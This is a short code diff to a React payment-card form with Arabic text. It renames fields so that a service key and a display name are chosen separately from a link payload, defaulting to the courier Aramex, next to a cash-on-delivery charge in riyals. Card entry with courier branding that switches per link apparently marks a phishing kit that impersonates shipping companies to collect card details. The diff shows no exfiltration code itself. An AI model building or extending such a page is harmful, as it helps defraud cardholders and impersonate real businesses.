@@ -24,8 +24,9 @@ const PaymentCardForm = () => {
   
   // Get customer info from sessionStorage
   const customerInfo = JSON.parse(sessionStorage.getItem('customerInfo') || '{}');
-  const serviceName = linkData?.payload?.service_name || customerInfo.service || 'aramex';
-  const branding = getServiceBranding(serviceName);
+  const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
+  const serviceName = linkData?.payload?.service_name || serviceKey;
+  const branding = getServiceBranding(serviceKey);
   const shippingInfo = linkData?.payload as any;
   const amount = shippingInfo?.cod_amount || 500;
   const formattedAmount = `${amount} ر.س`;
@@ -122,6 +123,7 @@ const PaymentCardForm = () => {
   return (
     <DynamicPaymentLayout
       serviceName={serviceName}
+      serviceKey={serviceKey}
       amount={formattedAmount}
       title="بيانات البطاقة"
       description={`أدخل بيانات البطاقة لخدمة ${serviceName}`}
